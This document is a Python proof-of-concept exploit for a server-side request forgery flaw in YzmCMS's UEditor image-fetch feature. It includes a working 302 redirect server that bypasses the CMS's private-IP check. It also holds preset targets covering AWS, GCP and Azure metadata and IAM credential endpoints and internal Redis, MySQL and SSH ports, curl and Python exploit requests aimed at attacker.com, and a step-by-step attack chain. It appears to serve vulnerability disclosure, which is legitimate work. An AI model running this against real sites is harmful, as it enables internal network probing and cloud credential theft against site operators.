#!/usr/bin/env python3
"""
YZMCMS-2025-002 PoC: UEditor saveRemote() SSRF via HTTP Redirect Bypass

Demonstrates the get_headers() redirect-following bypass:
  1. Attacker controls a public server returning 302 redirect
  2. Target YzmCMS validates initial URL's IP (non-private)
  3. get_headers() follows the 302 → SSRF to internal IP
  4. readfile() doesn't follow redirect, but get_headers() already fired

Usage:
  python yzmcms-002-ssrf-redirect-poc.py --mode server --port 8080
  python yzmcms-002-ssrf-redirect-poc.py --mode verify-code
  python yzmcms-002-ssrf-redirect-poc.py --mode full-demo
"""

import argparse
import sys
import json
import textwrap
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs


# ============================================================
# Code path verification
# ============================================================

def verify_code_paths():
    """Show the vulnerable code path with line-by-line analysis"""
    print("=" * 60)
    print("YZMCMS-2025-002: Code Path Verification")
    print("=" * 60)

    print("""
[VULNERABLE CODE] Uploader.class.php → saveRemote():

  Line 1:  $imgUrl = htmlspecialchars($this->fileField);
  Line 2:  $imgUrl = str_replace("&amp;", "&", $imgUrl);
  Line 3:  if (strpos($imgUrl, "http") !== 0) { ... return; }
           → [OK] Only http/https URLs accepted

  Line 4:  preg_match('/(^https*:\\/\\/[^:\\/]+)/', $imgUrl, $matches);
  Line 5:  $host = count($matches) > 1 ? $matches[1] : '';
  Line 6:  preg_match('/^https*:\\/\\/(.+)/', $host, $matches);
  Line 7:  $host_without_protocol = count($matches) > 1 ? $matches[1] : '';
  Line 8:  $ip = gethostbyname($host_without_protocol);
           → DNS resolution of initial URL only

  Line 9:  if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {
               $this->stateInfo = $this->getStateInfo("INVALID_IP");
               return;
           }
           → [BYPASSABLE] Only checks IP of INITIAL URL, not redirect target

  Line 10: $heads = get_headers($imgUrl, 1);    <- [VULN] FOLLOWS 302 REDIRECTS!
  Line 11: if (!(stristr($heads[0], "200") && stristr($heads[0], "OK"))) { ... }
           → [VULN] get_headers() sends HEAD/GET to redirect target
           → Internal request already made before readfile() check

  Line 12: $context = stream_context_create(
               array('http' => array('follow_location' => false))
           );
  Line 13: readfile($imgUrl, false, $context);
           → readfile() doesn't follow redirect, but TOO LATE

[ENTRY POINT] action_crawler.php → controller.php:
  GET/POST /common/static/plugin/ueditor/php/controller.php
    ?action=catchimage&source[]=http://attacker.com/redirect

[AUTH] yzm_action.php:
  Requires: isset($_SESSION['adminid']) || isset($_SESSION['_userid'])
  → Any registered member can trigger (not just admin)

[IMPACT] SSRF Blind:
  - get_headers() sends real HTTP request to internal target
  - Response content not returned to attacker (blind SSRF)
  - Can probe internal ports, services, cloud metadata endpoints
""")

    print("[+] CVSS 3.1: 5.0 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)")
    print("[+] CWE: CWE-918 (Server-Side Request Forgery)")
    print("[+] Verification complete - YZMCMS-2025-002 is a VALID finding.")


# ============================================================
# SSRF Redirect Server
# ============================================================

class SSRFRedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that redirects all requests to the configured internal target"""

    # Class-level config, set before server start
    redirect_target = "http://169.254.169.254/latest/meta-data/"
    target_description = "AWS IMDSv1 metadata endpoint"

    def respond_redirect(self):
        """Send 302 redirect to internal target"""
        self.send_response(302)
        self.send_header('Location', self.redirect_target)
        self.send_header('Server', 'nginx/1.24.0')  # Fake server header
        self.end_headers()

    def do_GET(self):
        print(f"\n[*] Incoming GET {self.path} from {self.client_address[0]}")
        print(f"    User-Agent: {self.headers.get('User-Agent', 'N/A')}")
        print(f"    → Redirecting to: {self.redirect_target}")
        self.respond_redirect()

    def do_HEAD(self):
        """get_headers() typically sends HEAD request first"""
        print(f"\n[*] Incoming HEAD {self.path} from {self.client_address[0]}")
        print(f"    User-Agent: {self.headers.get('User-Agent', 'N/A')}")
        print(f"    → [SSRF TRIGGERED] Target will follow redirect to: {self.redirect_target}")
        print(f"    → This means get_headers() has bypassed the IP check!")
        self.respond_redirect()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length else b''
        print(f"\n[*] Incoming POST {self.path} from {self.client_address[0]}")
        if post_data:
            print(f"    Data: {post_data[:200]}")
        self.respond_redirect()

    def log_message(self, format, *args):
        pass  # Suppress default logging


def start_redirect_server(port, target, description):
    """Start the malicious redirect server"""
    SSRFRedirectHandler.redirect_target = target
    SSRFRedirectHandler.target_description = description

    server = HTTPServer(('0.0.0.0', port), SSRFRedirectHandler)
    print(f"\n[*] SSRF Redirect Server running on http://0.0.0.0:{port}")
    print(f"[*] All requests → 302 → {target} ({description})")
    print(f"[*] Press Ctrl+C to stop")
    print()
    print(f"[!] To trigger SSRF on vulnerable YzmCMS target:")
    print(f"    curl -b cookies.txt \\")
    print(f"      'http://<target>/common/static/plugin/ueditor/php/controller.php' \\")
    print(f"      --data-urlencode 'action=catchimage' \\")
    print(f"      --data-urlencode 'source[]=http://<attacker_ip>:{port}/redirect'")
    print()
    print(f"    Or via browser (logged in as member):")
    print(f"    http://<target>/common/static/plugin/ueditor/php/controller.php")
    print(f"      ?action=catchimage&source[]=http://<attacker_ip>:{port}/redirect")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")


# ============================================================
# SSRF target presets
# ============================================================

SSRF_TARGETS = {
    "aws-metadata": {
        "url": "http://169.254.169.254/latest/meta-data/",
        "desc": "AWS IMDSv1 metadata endpoint"
    },
    "aws-credentials": {
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "desc": "AWS IAM credentials via IMDSv1"
    },
    "gcp-metadata": {
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "desc": "GCP metadata endpoint"
    },
    "azure-metadata": {
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "desc": "Azure IMDS metadata endpoint"
    },
    "localhost-80": {
        "url": "http://127.0.0.1:80/",
        "desc": "Localhost HTTP port scan"
    },
    "localhost-3306": {
        "url": "http://127.0.0.1:3306/",
        "desc": "MySQL port probe (will likely timeout/timeout error)"
    },
    "localhost-6379": {
        "url": "http://127.0.0.1:6379/",
        "desc": "Redis unauthorized access probe"
    },
    "localhost-22": {
        "url": "http://127.0.0.1:22/",
        "desc": "SSH port probe"
    },
    "docker-socket": {
        "url": "http://unix:/var/run/docker.sock:/",
        "desc": "Docker socket (won't work via get_headers but tests URL parsing)"
    },
    "custom": {
        "url": None,
        "desc": "Custom target URL"
    }
}


# ============================================================
# Exploit request generator
# ============================================================

def generate_exploit_requests(target_host, attacker_host, attacker_port):
    """Generate curl/Python exploit requests for different scenarios"""
    print("=" * 60)
    print("EXPLOIT REQUEST TEMPLATES")
    print("=" * 60)

    print(f"""
[1] Direct SSRF via GET (simplest):
    curl -b cookies.txt \\
      "{target_host}/common/static/plugin/ueditor/php/controller.php?action=catchimage&source[]=http://{attacker_host}:{attacker_port}/redirect"

[2] SSRF via POST (more realistic):
    curl -b cookies.txt \\
      -X POST "{target_host}/common/static/plugin/ueditor/php/controller.php" \\
      -d "action=catchimage&source[]=http://{attacker_host}:{attacker_port}/redirect"

[3] Multi-URL probe (bypass domain ignore list?):
    curl -b cookies.txt \\
      "{target_host}/common/static/plugin/ueditor/php/controller.php?action=catchimage&source[]=http://{attacker_host}:{attacker_port}/redirect&source[]=http://{attacker_host}:{attacker_port}/redirect2"

[4] Python script (full automation):
    import requests

    session = requests.Session()
    # Login as member
    session.post('{target_host}/member/index/login', data={{
        'username': 'attacker',
        'password': 'attacker123'
    }})
    # Trigger SSRF
    r = session.get(
        '{target_host}/common/static/plugin/ueditor/php/controller.php',
        params={{
            'action': 'catchimage',
            'source[]': 'http://{attacker_host}:{attacker_port}/redirect'
        }}
    )
    print(r.text)
""")

    print("[*] Note: get_headers() default timeout may vary. Use timing analysis")
    print("[*] to distinguish between open ports (fast error) and filtered ports (timeout).")


# ============================================================
# Full attack demo
# ============================================================

def full_attack_demo():
    """Print the full attack chain walkthrough"""
    print("""
================================================================
FULL ATTACK CHAIN: YZMCMS-2025-002
================================================================

SCENARIO: Attacker has registered a member account on a YzmCMS site
          hosted on AWS EC2. Goal: access instance metadata.

PHASE 1: SETUP
  Attacker sets up a public redirect server:
    python yzmcms-002-ssrf-redirect-poc.py --mode server --port 8080 --target aws-metadata

  Server responds to all requests with:
    HTTP/1.0 302 Found
    Location: http://169.254.169.254/latest/meta-data/

PHASE 2: MEMBER LOGIN
  Attacker logs in with their member account:
    POST /member/index/login
    username=attacker&password=attacker123
    → Session cookie obtained

PHASE 3: TRIGGER SSRF
  Attacker sends catchimage request with their redirect URL:
    GET /common/static/plugin/ueditor/php/controller.php
      ?action=catchimage
      &source[]=http://attacker.com:8080/redirect

  YzmCMS processes this in saveRemote():
    1. imgUrl = "http://attacker.com:8080/redirect"
    2. gethostbyname("attacker.com") → <public_ip>  [PASSES check]
    3. filter_var(<public_ip>, FILTER_FLAG_NO_PRIV_RANGE) → true [PASSES!]
    4. get_headers("http://attacker.com:8080/redirect")
       → HEAD request to attacker.com:8080
       → Attacker returns 302 → Location: http://169.254.169.254/...
       → PHP get_headers() FOLLOWS the redirect!
       → HEAD request to http://169.254.169.254/latest/meta-data/  [SSRF!]
    5. AWS metadata service responds (or connection timeout = port open)
    6. readfile() doesn't follow redirect (follow_location=false)
       → But the internal request was already made in step 4

PHASE 4: BLIND SSRF EXPLOITATION
  Attacker can't see the response, but can:
    - Detect port openness via timing/error differences
    - Map internal network topology
    - Access cloud metadata (IMDSv1)
    - Probe internal services

VARIATIONS:
  1. Port scanning: Change redirect target to different internal IPs/ports
  2. Cloud metadata: AWS/GCP/Azure/DigitalOcean metadata endpoints
  3. Internal APIs: Probe known internal service endpoints

LIMITATIONS (Blind SSRF):
  - Response content not returned to attacker
  - PHP stream context may have timeout limits
  - Only HTTP/HTTPS protocols via get_headers()
  - IMDSv2 requires PUT + session token (not exploitable via redirect)

================================================================
[+] YZMCMS-2025-002 PoC complete.
""")


# ============================================================
# Main
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description='YZMCMS-2025-002 PoC: UEditor saveRemote() SSRF via HTTP Redirect',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        Examples:
          %(prog)s --mode verify-code              # Analyze vulnerable code paths
          %(prog)s --mode server --port 8080        # Start SSRF redirect server
          %(prog)s --mode server --target aws-metadata  # Redirect to AWS metadata
          %(prog)s --mode server --target custom --redirect-url http://127.0.0.1:6379
          %(prog)s --mode exploit-request --victim http://target.com --attacker 1.2.3.4
          %(prog)s --mode full-demo                 # Print attack chain walkthrough
        """))
    parser.add_argument('--mode', choices=[
        'verify-code', 'server', 'exploit-request', 'full-demo', 'list-targets'
    ], default='full-demo', help='Operation mode (default: full-demo)')
    parser.add_argument('--port', type=int, default=8080,
                        help='Port for redirect server (default: 8080)')
    parser.add_argument('--target', choices=list(SSRF_TARGETS.keys()),
                        default='aws-metadata',
                        help='Predefined SSRF target (default: aws-metadata)')
    parser.add_argument('--redirect-url', default=None,
                        help='Custom redirect URL (requires --target custom)')
    parser.add_argument('--victim', default='http://target-yzmcms.com',
                        help='Victim YzmCMS URL for exploit templates')
    parser.add_argument('--attacker', default='attacker.com',
                        help='Attacker host for exploit templates')

    args = parser.parse_args()

    if args.mode == 'verify-code':
        verify_code_paths()
    elif args.mode == 'list-targets':
        print("Predefined SSRF targets:")
        for name, info in SSRF_TARGETS.items():
            print(f"  {name:20s} → {info['url']}")
            print(f"  {'':20s}   {info['desc']}")
            print()
    elif args.mode == 'server':
        if args.target == 'custom':
            if not args.redirect_url:
                print("[!] --redirect-url required for custom target")
                sys.exit(1)
            target_url = args.redirect_url
            target_desc = "Custom target"
        else:
            target_url = SSRF_TARGETS[args.target]['url']
            target_desc = SSRF_TARGETS[args.target]['desc']
        start_redirect_server(args.port, target_url, target_desc)
    elif args.mode == 'exploit-request':
        generate_exploit_requests(args.victim, args.attacker, args.port)
    elif args.mode == 'full-demo':
        verify_code_paths()
        full_attack_demo()


if __name__ == '__main__':
    main()
